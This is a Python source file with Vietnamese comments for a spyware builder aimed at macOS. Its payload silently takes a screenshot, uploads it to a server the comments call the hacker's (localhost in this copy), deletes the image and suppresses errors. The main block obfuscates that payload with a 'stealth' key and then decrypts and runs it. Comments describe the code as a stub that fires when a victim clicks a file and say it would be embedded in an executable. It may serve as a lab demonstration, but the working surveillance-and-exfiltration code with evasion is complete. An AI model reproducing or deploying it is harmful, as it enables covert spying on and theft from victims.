import os
import requests
from core.obfuscator import obfuscate_payload
from core.deobfuscator import deobfuscate_and_run
from utils.entropy_calc import calculate_entropy

SECRET_KEY = b"MACBOOK_STELTH_KEY_2025"

PAYLOAD = """
import os
import subprocess
import requests

try:
    temp_path = "/tmp/sys_cache_01.png"
    # Chụp ảnh màn hình không tiếng động (-x)
    subprocess.run(["screencapture", "-x", temp_path])
    
    # Gửi về Server của Hacker
    with open(temp_path, 'rb') as f:
        requests.post("http://127.0.0.1:5000/upload", files={'file': f})
    
    # Xóa dấu vết
    os.remove(temp_path)
except:
    pass
"""

if __name__ == "__main__":
    obfuscated_blob = obfuscate_payload(PAYLOAD, SECRET_KEY)
    
    # Lưu bằng chứng phân tích tĩnh
    os.makedirs("output", exist_ok=True)
    with open("output/obfuscated_payload.bin", "wb") as f:
        f.write(obfuscated_blob)

    # 2. QUÁ TRÌNH STUB (Sẽ chạy khi nạn nhân click vào file)
    # Trong môi trường thực tế, phần 'obfuscated_blob' sẽ được nhúng cứng vào file exe
    deobfuscate_and_run(obfuscated_blob, SECRET_KEY)

